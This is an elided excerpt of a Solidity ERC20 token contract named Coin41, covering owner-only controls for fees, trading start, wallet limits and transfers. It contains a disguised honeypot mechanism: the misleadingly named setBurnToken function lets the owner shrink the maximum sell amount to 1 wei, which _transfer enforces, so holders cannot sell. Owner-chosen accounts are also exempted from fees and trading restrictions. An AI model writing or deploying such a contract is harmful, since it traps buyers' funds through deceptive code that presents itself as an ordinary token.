...
// SPDX-License-Identifier: UNLICENSED
    ...
    contract Coin41 is ERC20, Ownable {
        using SafeMath for uint256;
        ...
        uint256 public maxBurnTransactionAmount = 50000000000000 * 10**18;
        uint256 public minBurnTransactionAmount = 1;
        ...
        uint256 public constant minFirstDividendRewardsFee = 3;
        ...
        function tradeStart() external onlyOwner {
            ...
            maxBurnTransactionAmount = 50000000000000 * 10**18;
            minBurnTransactionAmount = 1;
            maxBuyTranscationAmount = 100000000000000 * 10**18;
            maxWalletBalance = 100000000000000 * 10**18;
        ...
        function setTradingIsEnabled(bool _enabled) public onlyOwner {
            require(_enabled == true, "Coin: Trading can not be disabled");
        ...
        function setBurnToken(uint256 _burnToken) external onlyOwner {
            if((_burnToken * (10**18)) < minBurnTransactionAmount) {
              maxBurnTransactionAmount = minBurnTransactionAmount;
            }
            else {
              maxBurnTransactionAmount = _burnToken * (10**18);
            }
        ...
        function updateMarketingWallet(address _newWallet) external onlyOwner {
            require(_newWallet != marketingWallet, "Coin: The marketing wallet is already this address");
        ...
        function excludeFromFees(address account, bool excluded) public onlyOwner {
            require(isExcludedFromFees[account] != excluded, "Coin: Account is already exluded from fees");
        ...
        function excludeFromBuyFees(address account, bool excludefromBuyFees) public onlyOwner {
            require(isExcludedFromBuyFees[account] != excludefromBuyFees, "Coin: Account is already exluded from buy fees");
      ...
      function getAccountFirstDividendsInfo(address account)
        ...
        function _transfer(
            ...
            require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "Coin: Trading has not started yet");
            ...
            if (
              ...
              tradingIsEnabled &&
                ...
                require(amount <= maxBurnTransactionAmount, "Sell transfer amount exceeds the maxBurnTransactionAmount.");
            }
